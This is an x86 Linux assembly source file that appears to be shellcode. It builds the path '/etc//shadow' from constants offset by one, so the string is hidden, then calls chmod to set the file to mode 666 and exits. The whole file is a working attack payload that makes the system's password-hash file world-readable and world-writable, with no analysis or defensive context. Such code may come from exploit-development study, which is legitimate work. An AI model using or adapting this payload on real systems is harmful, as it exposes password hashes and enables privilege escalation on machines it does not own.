; chmod_shadow.asm
;
; Author: Dennis Tan
; Date: 11-June-2020

global _start

section .text
    _start:
        xor ebx,ebx
        mul ebx
        push ebx
        
        ; wodahs//cte/
        mov esi, 0x776f6462
        dec esi
        mov edi, 0x68732f30
        dec edi
        lea edx, [0x6374652e+1]
        
        push esi
        push edi
        push edx
        mov ebx,esp
        mov cx, 0x1b6
        mov al,0xf
        int 0x80
        
        mov al, 0x1
        int 0x80
